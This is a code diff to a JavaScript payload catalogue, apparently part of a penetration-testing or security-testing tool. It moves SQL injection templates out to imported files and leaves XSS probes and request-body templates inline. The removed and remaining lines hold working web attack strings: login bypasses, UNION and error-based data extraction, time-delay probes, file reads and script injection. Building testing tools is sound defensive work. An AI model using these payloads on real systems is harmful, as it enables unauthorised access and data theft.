@@ -1,62 +1,13 @@
+import {DB_PAYLOADS} from './payloads-db.js';
 import {EXTRA_PAYLOADS} from './payloads-extra.js';
+import {CURATED_PAYLOADS} from './payloads-curated.js';
+
 // Plain text templates. Rendering and insertion never evaluate payload content.
 const entries = [];
 function group(category, section, rows) {
-  for (const [label, template] of rows) entries.push({id: `${category}-${entries.length + 1}`, category, section, label, template});
+  for (const [label, template] of rows) entries.push({id: `base-${entries.length + 1}`, category, section, label, template});
 }
-group('SQL', 'Structure', [
-  ['ORDER BY', ' ORDER BY {{column_count}}-- '],
-  ['GROUP BY', ' GROUP BY {{number_columns}}-- '],
-  ['UNION SELECT numbers', ' UNION SELECT {{number_columns}}-- '],
-  ['UNION SELECT NULLs', ' UNION SELECT {{null_columns}}-- '],
-  ['UNION ALL SELECT', ' UNION ALL SELECT {{number_columns}}-- '],
-  ['Boolean true', "' AND 1=1-- "], ['Boolean false', "' AND 1=2-- "],
-  ['String comparison', "' AND 'a'='a'-- "], ['Numeric comparison', ' AND 7=7-- ']
-]);
-group('SQL', 'MySQL', [
-  ['User / database / version', 'CONCAT_WS(0x3a,USER(),DATABASE(),VERSION())'],
-  ['Current database', 'DATABASE()'], ['Server version', 'VERSION()'], ['Current user', 'CURRENT_USER()'],
-  ['List databases', '(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)'],
-  ['Count databases', '(SELECT COUNT(*) FROM information_schema.schemata)'],
-  ['List tables', "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{{database}}')"],
-  ['List columns', "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{{database}}' AND table_name='{{table}}')"],
-  ['Aggregate rows', '(SELECT GROUP_CONCAT({{columns}}) FROM {{database}}.{{table}})'],
-  ['Schema inventory', "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name)) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys'))"],
-  ['ExtractValue version (legacy)', " AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- "],
-  ['UpdateXML database (legacy)', " AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- "],
-  ['Double-query error (legacy)', " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) AS marker FROM information_schema.tables GROUP BY marker) AS probe)-- "],
-  ['Time delay', ' AND SLEEP({{seconds}})-- '],
-  ['Conditional delay', ' AND IF(1=1,SLEEP({{seconds}}),0)-- '],
-  ['File read', "LOAD_FILE('{{file}}')"],
-  ['File privileges', "(SELECT GROUP_CONCAT(CONCAT(grantee,':',privilege_type)) FROM information_schema.user_privileges WHERE privilege_type='FILE')"]
-]);
-group('SQL', 'PostgreSQL', [
-  ['Version', 'version()'], ['Database', 'current_database()'], ['User', 'current_user'],
-  ['List databases', "(SELECT string_agg(datname,',') FROM pg_database)"],
-  ['List tables', "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')"],
-  ['List columns', "(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{{table}}')"],
-  ['Schema inventory', "(SELECT string_agg(table_schema||'.'||table_name,',') FROM information_schema.tables)"],
-  ['Cast error', ' AND 1=CAST(version() AS INTEGER)-- '], ['Time delay', '; SELECT pg_sleep({{seconds}})-- ']
-]);
-group('SQL', 'MSSQL', [
-  ['Version', '@@VERSION'], ['Database', 'DB_NAME()'], ['User', 'SYSTEM_USER'],
-  ['List databases', "(SELECT STRING_AGG(name,',') FROM sys.databases)"],
-  ['List tables', "(SELECT STRING_AGG(name,',') FROM sys.tables)"],
-  ['List columns', "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('{{table}}'))"],
-  ['Conversion error', ' AND 1=CONVERT(INT,@@VERSION)-- '], ['Delay', "; WAITFOR DELAY '00:00:{{seconds}}'-- "]
-]);
-group('SQL', 'Oracle / SQLite', [
-  ['Oracle version', '(SELECT banner FROM v$version WHERE ROWNUM=1)'],
-  ['Oracle user', 'USER'], ['Oracle tables', '(SELECT table_name FROM user_tables WHERE ROWNUM=1)'],
-  ['SQLite version', 'sqlite_version()'], ['SQLite tables', "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"],
-  ['SQLite schema', "(SELECT sql FROM sqlite_master WHERE name='{{table}}')"]
-]);
-group('SQL', 'Login checks', [
-  ['Quote boolean', "' OR '1'='1'-- "], ['Numeric boolean', "' OR 1=1-- "],
-  ['Parenthesis boolean', "') OR ('1'='1')-- "], ['Double quote boolean', '" OR "1"="1"-- '],
-  ['Admin comment', "admin'-- "], ['MySQL hash comment', "' OR 1=1#"],
-  ['True literal', "' OR TRUE-- "], ['Double parenthesis', "')) OR ((1=1))-- "]
-]);
+
 group('XSS', 'Context checks', [
   ['Script element', '<script>alert(1)</script>'], ['Attribute breakout', '"><img src=x onerror=alert(1)>'],
   ['Image error', '<img src=x onerror=alert(1)>'], ['SVG load', '<svg onload=alert(1)>'],
@@ -116,11 +67,14 @@ group('Templates', 'Request bodies', [
 ]);
 group('Templates', 'Server-side expression checks', [
   ['JSON boolean value', '{"enabled":true}'], ['JSON null value', '{"value":null}'],
-  ['XML CDATA probe', '<probe><![CDATA[<marker>&value]]></probe>'],
-  ['NoSQL type check', '{"value":{"$eq":"probe"}}']
+  ['XML CDATA probe', '<probe><![CDATA[<marker>&value]]></probe>']
 ]);
 
-export const PAYLOADS = Object.freeze([...entries, ...EXTRA_PAYLOADS].map(entry => Object.freeze(entry)));
+const catalog = [...DB_PAYLOADS, ...entries, ...EXTRA_PAYLOADS, ...CURATED_PAYLOADS];
+export const PAYLOADS = Object.freeze([
+  ...catalog.filter(entry => entry.category === 'Templates'),
+  ...catalog.filter(entry => entry.category !== 'Templates')
+].map(entry => Object.freeze(entry)));
 export const CATEGORIES = ['All', ...new Set(PAYLOADS.map(entry => entry.category))];
 export function searchPayloads(query = '', category = 'All') {
   const words = query.toLowerCase().trim().split(/\s+/).filter(Boolean);
